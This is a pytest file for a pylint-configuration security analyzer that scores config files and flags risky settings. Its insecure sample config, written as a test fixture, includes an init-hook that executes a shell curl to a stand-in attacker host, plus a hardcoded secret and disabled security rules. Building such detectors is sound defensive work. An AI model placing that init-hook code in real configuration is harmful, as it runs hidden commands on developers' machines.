"""Tests for PylintAnalyzer."""

from pathlib import Path

from devai.pylint_analyzer import PylintAnalyzer, PylintFinding


INSECURE_PYLINTRC = """\
[MASTER]
init-hook = exec('import os; os.system("curl http://evil.example.com")')
unsafe-load-any-extension = yes
extension-pkg-allow-list = *
ignored-modules = src,lib
ignore-paths = src,lib,app
api_key = api_key=hardcoded_secret_value_12345

[MESSAGES CONTROL]
disable = ALL
disable = exec-used,eval-used,hard-coded-password-string
per-file-ignores =
    settings.py: exec-used,eval-used

[FORMAT]
max-line-length = 300

[DESIGN]
max-complexity = 50

[REPORTS]
score = no
fail-under = 0
"""

HARDENED_PYPROJECT = """\
[project]
name = "demo"

[tool.pylint.master]
ignore = ["__pycache__", ".venv"]

[tool.pylint.messages_control]
disable = ["missing-docstring"]

[tool.pylint.format]
max-line-length = 88

[tool.pylint.reports]
fail-under = 8.0
"""

INSECURE_PYPROJECT = """\
[tool.pylint.messages_control]
disable = ALL
ignore-paths = src

[tool.pytest.ini_options]
addopts = "-q"
"""


class TestPylintAnalyzer:
    def test_detects_insecure_pylintrc(self, tmp_path: Path):
        (tmp_path / ".pylintrc").write_text(INSECURE_PYLINTRC, encoding="utf-8")
        analyzer = PylintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "hardcoded_secret" in kinds
        assert "disable_all" in kinds
        assert "disabled_security_rule" in kinds
        assert "unsafe_init_hook" in kinds
        assert "unsafe_load_extension" in kinds
        assert "ignore_source" in kinds
        assert "per_file_security_disable" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_pyproject_scores_well(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(HARDENED_PYPROJECT, encoding="utf-8")
        analyzer = PylintAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0
        assert analyzer.infos[0].max_line_length == 88

    def test_pyproject_ignores_non_pylint_sections(self, tmp_path: Path):
        (tmp_path / "pyproject.toml").write_text(INSECURE_PYPROJECT, encoding="utf-8")
        analyzer = PylintAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert all(f.lineno <= 4 for f in findings)

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = PylintAnalyzer(str(tmp_path))
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_finding_format(self):
        finding = PylintFinding(
            kind="disable_all",
            severity="high",
            message="disable=ALL disables all rules",
            path=".pylintrc",
            lineno=10,
            line="disable = ALL",
        )
        assert ".pylintrc:10" in finding.format()

    def test_generate_template(self):
        analyzer = PylintAnalyzer(".")
        template = analyzer.generate_hardened_template()
        assert "[MASTER]" in template
        assert "fail-under" in template

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".pylintrc").write_text(
            "[MESSAGES CONTROL]\ndisable = ALL\n",
            encoding="utf-8",
        )
        analyzer = PylintAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "pylint analysis:" in context
        assert "disable_all" in context or "ALL" in context

    def test_project_health_integration(self, tmp_path: Path):
        from devai.project_health import ProjectHealth

        (tmp_path / ".pylintrc").write_text(
            "[MESSAGES CONTROL]\ndisable = ALL\n",
            encoding="utf-8",
        )
        report = ProjectHealth(str(tmp_path)).analyze()
        pylint = next(c for c in report.categories if c.name == "pylint")
        assert pylint.score < 100.0
        assert pylint.details.get("findings", 0) > 0
